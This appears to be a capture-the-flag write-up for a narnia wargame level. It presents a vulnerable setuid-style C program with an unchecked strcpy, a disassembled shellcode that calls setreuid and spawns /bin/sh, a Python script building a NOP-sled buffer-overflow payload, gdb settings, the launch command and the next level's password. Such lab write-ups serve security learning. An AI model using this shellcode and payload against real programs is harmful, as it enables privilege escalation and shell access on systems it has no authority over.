# Overview
We get the following C code:
```
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

That one is very similar to narnia2. There is that loop that zeroes out environment variable, but it doesn't impact the solution I had for narnia2. Mystery...

# Shellcode and python script
I used the following shellcode
```
0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  31 c9                   xor    ecx,ecx
6:  66 b9 b5 36             mov    cx,0x36b5
a:  66 bb b5 36             mov    bx,0x36b5
e:  b0 46                   mov    al,0x46
10: cd 80                   int    0x80
12: 31 db                   xor    ebx,ebx
14: 31 c9                   xor    ecx,ecx
16: 99                      cdq
17: 6a 0b                   push   0xb
19: 58                      pop    eax
1a: 51                      push   ecx
1b: 68 2f 2f 73 68          push   0x68732f2f
20: 68 2f 62 69 6e          push   0x6e69622f
25: 89 e3                   mov    ebx,esp
27: 51                      push   ecx
28: 89 e2                   mov    edx,esp
2a: 53                      push   ebx
2b: 89 e1                   mov    ecx,esp
2d: cd 80                   int    0x80
```

And the following python script to build a payload (while guessing the address for top of the stack)
```python
import argparse
import sys


def read_address(address):
    if address.startswith('0x'):
        address = address[2:]

    foo = bytearray.fromhex(address)
    foo.reverse()
    return(bytes(foo))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('address')
    args = parser.parse_args()

    payload  = b'\x90' * 181 
    payload += b'\x31\xC0\x31\xDB\x31\xC9\x66\xB9'
    payload += b'\xB5\x36\x66\xBB\xB5\x36\xB0\x46'
    payload += b'\xCD\x80\x31\xDB\x31\xC9\x99\x6A'
    payload += b'\x0B\x58\x51\x68\x2F\x2F\x73\x68'
    payload += b'\x68\x2F\x62\x69\x6E\x89\xE3\x51'
    payload += b'\x89\xE2\x53\x89\xE1\xCD\x80'
    payload += b'\x90' * 20  
    payload += read_address(args.address)
    payload += read_address(args.address)
    payload += read_address(args.address)
    
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
```

The only difference with narnia2 is that the stack frame now has a 256 byte buffer, and a 4 byte integer, so we need to overwrite 268 bytes in total.


```
set disassembly-flavor intel
tui new-layout foobar {-horizontal asm 2 regs 1} 2 status 0 cmd 1
layout foobar
break *main+82
```


```
/narnia/narnia2 $(python3 gen_payload.py 0xffffd108)
```

# The end
Password for the next level is `Ni3xHPEuuw`.
